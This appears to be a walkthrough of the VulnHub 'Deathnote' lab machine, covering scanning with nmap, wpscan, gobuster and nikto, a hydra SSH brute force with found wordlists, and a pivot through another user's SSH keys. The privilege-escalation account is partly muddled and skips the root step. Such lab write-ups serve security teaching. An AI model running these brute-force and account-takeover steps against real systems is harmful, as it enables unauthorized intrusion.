<img width="1500" height="640" alt="Screenshot 2026-05-28 215039" src="https://github.com/user-attachments/assets/6a6a30c4-ebdf-4474-821d-684ff854e1d6" />URL : [Deathnote](https://www.vulnhub.com/entry/deathnote-1,739/)

# Setting up

Open Virtual Box, click on Import, then this window pops up and choose the `deathnote.ova` file
<img width="516" height="472" alt="Screenshot 2026-05-28 145200" src="https://github.com/user-attachments/assets/19a26162-839b-48f3-ae29-505a5f5b06f2" />

Open VM instance setting of Deathnote
<img width="775" height="520" alt="Screenshot 2026-05-28 145223" src="https://github.com/user-attachments/assets/53cf6ea1-f7c8-4014-b08a-f5b282138176" />

NOTE: Ensure that attacker Virtual machin is on the same network as the victim machine

# Enumeration
First of all, I need to locate what is the victim IP address, checking my IP address first
```
$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.101  netmask 255.255.255.0  broadcast 192.168.56.255
... <SNIP>...
````

Assumably, the victim IP address is on the same network as my attack machine, by using `netdiscover` to find out where it is
```
$ sudo netdiscover -r 192.168.56.0/24
...<SNIP>...
 Currently scanning: Finished!   |   Screen View: Unique Hosts                                            
                                                                                                          
 52 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 3120                                        
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:05      1      60  Unknown vendor                                         
 192.168.56.100  08:00:27:83:c8:1a     31    1860  PCS Systemtechnik GmbH                                 
 192.168.56.102  08:00:27:15:79:19     20    1200  PCS Systemtechnik GmbH
...<SNIP>...
```
NOTE: `netdiscover` requries root privilege to execute 

Now, time for further enumeration, starting with `nmap`
```
$ sudo nmap -T4 -sV -sC -O -A -vv 192.168.56.102
<SNIP>
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 5e:b8:ff:2d:ac:c7:e9:3c:99:2f:3b:fc:da:5c:a3:53 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCm89TpyON8aYXST7z9QwF/lZeqXiejtLOaVDmyxME7S2M1Z+57KxnB8ixV0MArX+cNTWO92xYlTiYKIKusPwrB43AArYrnHTLUg79N59GhbreA8yX2xxwuJq/+tu2ieMS7QORyKJVZCRwV/EVHknQyg+jrXLtD74C869l9wb3S9yIeSK1UGNrbdAgOPZtG4pFFRcKghC4wtuukqaE7uIv4yO8mHOo+p+V8+Ab3tbmIG2KZLbb3hW3vjKc4XxBnoJTWwsX6zkV/1HnfE+ptFzs0sHWpyiAKtUGs4AkfymcG5SDyuAkBBiABpBbzBK/Lzcjhb7dJGpqPac+M+lxIb+T1
|   256 a8:f3:81:9d:0a:dc:16:9a:49:ee:bc:24:e4:65:5c:a6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCh/urbdjg8yYyJTf6zXc0OVNr9nZ8BXv26XthpOdSCdnIMLKNmlAbONw9KKJ05/BS/7T+zg/LHdA5FAAHL8OFw=
|   256 4f:20:c3:2d:19:75:5b:e8:1f:32:01:75:c2:70:9a:7e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII9njk3MGTFBM1ueTjfLjhVUE0a485AyO7kFm0enSRap
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
<SNIP>
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
<SNIP>
```
So the target is using Linux OS, and there are 2 open ports which are SSH - 22 and HTTP - 80, port 80 seems to catch my interest, so I tried to access 
<img width="1281" height="832" alt="Screenshot 2026-05-28 141824" src="https://github.com/user-attachments/assets/36c5cc3b-4d88-455b-b90e-3e28739acecc" />

So I have to add domain name in the `hosts` file in order to access the victim HTTP service, which will look like this
<img width="1867" height="870" alt="Screenshot 2026-05-28 153044" src="https://github.com/user-attachments/assets/243b05cc-b9a9-4ba9-a7aa-367d307f741f" />



Next, I notice that the victim use Wordpress CMS, so I decided to use `wpscan` which is a tool for scanning wordpress CMS service
```
spscan --url http://deathnote.vuln/wordpress/
<SNIP>
[+] Upload directory has listing enabled: http://deathnote.vuln/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
<SNIP>
```
The Upload URL above give me access to further enumerate interesting things more
<img width="1906" height="861" alt="Screenshot 2026-05-28 144441" src="https://github.com/user-attachments/assets/5c3201da-99ce-4755-9e23-f3ebbf8cefaa" />

Then I found 2 interesting files: 
### notes.txt
```
death4
death4life
death4u
death4ever
death4all
death420
death45
death4love
death49
death48
death456
death4014
1death4u
yaydeath44
thedeath4u2
thedeath4u
stickdeath420
reddeath44
megadeath44
megadeath4
killdeath405
hot2death4sho
death4south
death4now
death4l0ve
death4free
death4elmo
death4blood
death499Eyes301
death498
death4859
death47
death4545
death445
death444
death4387n
death4332387
death42521439
death42
death4138
death411
death405
death4me
```

### user.txt
```
KIRA
L
ryuk
rem
misa
siochira 
light
takada
near
mello
l
kira
RYUK
REM
SIOCHIRA
LIGHT
NEAR
```
I assumed that these text files must relate to give me a valid credentials. It's time to find the login portal to try. 

## Enumerating directory
In this phase I use `gobuster` which is a tool for enumerating directory, I will use `dir` mode for directory and worlist : `/usr/share/wordlists/dirb/big.txt`
```
gobuster dir -u http://deathnote.vuln/ -w /usr/share/wordlists/dirb/big.txt
<SNIP>

manual               (Status: 301) [Size: 317] [--> http://deathnote.vuln/manual/]
robots.txt           (Status: 200) [Size: 68]
server-status        (Status: 403) [Size: 279]
wordpress            (Status: 301) [Size: 320] [--> http://deathnote.vuln/wordpress/]
<SNIP>

```
So this service has a `robots.txt` file 
<img width="609" height="191" alt="Screenshot 2026-05-28 153955" src="https://github.com/user-attachments/assets/4ee3032c-aaa1-4c9a-a1a2-5b794c41ff75" />

But when I access the /important.jpg, it gave me nothing 
<img width="1892" height="142" alt="Screenshot 2026-05-28 154123" src="https://github.com/user-attachments/assets/8430cabf-548f-4794-8b5c-c27587f324a1" />


Well, in this case, I will use `nikto`   which is a tool for scanning web security in general

```
nikto -h http://deathnote.vuln/
<SNIP>
+ [006668] /wordpress/wp-login.php: WordPress login found.
<SNIP>
```

I found the login page, but what about the credentials, Akwardly, the credential is always stay plain in sight, looking at the main page I got `KIRA:iamjustic3` which successfully grants me access. During the time I was on the wordpress dashboard, I could not find anything yet.
So I decided to use the `user.txt` file as username and `notes.txt` as password along with hydra to bruteforce `ssh`
```
$ hydra -L user.txt -P notes.txt ssh://192.168.56.102
<SNIP>
[22][ssh] host: 192.168.56.102   login: l   password: death4me
<SNIP>
```

# Privilege Escalation

In `l` directory I found another `user.txt` file
```
l@deathnote:~$ whoami
l
l@deathnote:~$ ls
user.txt
l@deathnote:~$ cat user.txt
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++.<<++.>>+++++++++++.------------.+.+++++.---.<<.>>++++++++++.<<.>>--------------.++++++++.+++++.<<.>>.------------.---.<<.>>++++++++++++++.-----------.---.+++++++..<<.++++++++++++.------------.>>----------.+++++++++++++++++++.-.<<.>>+++++.----------.++++++.<<.>>++.--------.-.++++++.<<.>>------------------.+++.<<.>>----.+.++++++++++.-------.<<.>>+++++++++++++++.-----.<<.>>----.--.+++..<<.>>+.--------.<<.+++++++++++++.>>++++++.--.+++++++++.-----------------.
```

Identifying the format of cipher
<img width="1920" height="1032" alt="Screenshot 2026-05-28 211314" src="https://github.com/user-attachments/assets/a8d7edde-d3bf-46b4-8668-37f824093aa7" />


Reference : [Decoder](https://www.dcode.fr/brainfuck-language)
The result is :
```
i think u got the shell , but you wont be able to kill me -kira
```

By checking what permission do I have with `l`, unfortunately I don't have any, but I assumed that there would be another higher-privileged user, then I found `kira` folder, next I tried to access his folder which granted me access succefully (broken access control)


```
/home/kira/.ssh$ cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDyiW87OWKrV0KW13eKWJir58hT8IbC6Z61SZNh4Yzm9XlfTcCytDH56uhDOqtMR6jVzs9qCSXGQFLhc6IMPF69YMiK9yTU5ahT8LmfO0ObqSfSAGHaS0i5A73pxlqUTHHrzhB3/Jy93n0NfPqOX7HGkLBasYR0v/IreR74iiBI0JseDxyrZCLcl6h9V0WiU0mjbPNBGOffz41CJN78y2YXBuUliOAj/6vBi+wMyFF3jQhP4Su72ssLH1n/E2HBimD0F75mi6LE9SNuI6NivbJUWZFrfbQhN2FSsIHnuoLIJQfuFZsQtJsBQ9d3yvTD2k/POyhURC6MW0V/aQICFZ6z l@deathnote
```
I tried to create a pair of ssh key by using ssh-keygen, however, I received this warning
```
l@deathnote:/home/kira/.ssh$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/l/.ssh/id_rsa): 
/home/l/.ssh/id_rsa already exists.
Overwrite (y/n)? n
```

By copying the `authorized_keys` to `/home/l/.ssh` folder to give me access to use `id_rsa` to escalate my privilege to become `kira`
```
~/.ssh$ ssh kira@192.168.56.102 -i id_rsa
```

Now, I can read `kira.txt`
```
kira@deathnote:~$ cat kira.txt
cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp
kira@deathnote:~$ cat kira.txt | base64 -d
please protect one of the following 
1. L (/opt)
2. Misa (/var)
```


In `/opt/L/fake-notebook-rule/` locates a `.wav` file which returns hex characters
By using cyberchef 
<img width="1500" height="640" alt="Screenshot 2026-05-28 215039" src="https://github.com/user-attachments/assets/9f1e6960-b80e-4faf-a4f6-5bda7db6de00" />

```
passwd : kiraisevil
```
-> after checking the password belong to user `kira`

Now, checking `/var`
```
kira@deathnote:~$ cat /var/misa
it is toooo late for misa
```

# Post Privilege Escalation
```
root@deathnote:~# cat root.txt


      ::::::::       ::::::::       ::::    :::       ::::::::       :::::::::           :::    :::::::::::       :::::::: 
    :+:    :+:     :+:    :+:      :+:+:   :+:      :+:    :+:      :+:    :+:        :+: :+:      :+:          :+:    :+: 
   +:+            +:+    +:+      :+:+:+  +:+      +:+             +:+    +:+       +:+   +:+     +:+          +:+         
  +#+            +#+    +:+      +#+ +:+ +#+      :#:             +#++:++#:       +#++:++#++:    +#+          +#++:++#++   
 +#+            +#+    +#+      +#+  +#+#+#      +#+   +#+#      +#+    +#+      +#+     +#+    +#+                 +#+    
#+#    #+#     #+#    #+#      #+#   #+#+#      #+#    #+#      #+#    #+#      #+#     #+#    #+#          #+#    #+#     
########       ########       ###    ####       ########       ###    ###      ###     ###    ###           ########       

##########follow me on twitter###########3
and share this screen shot and tag @KDSAMF
```



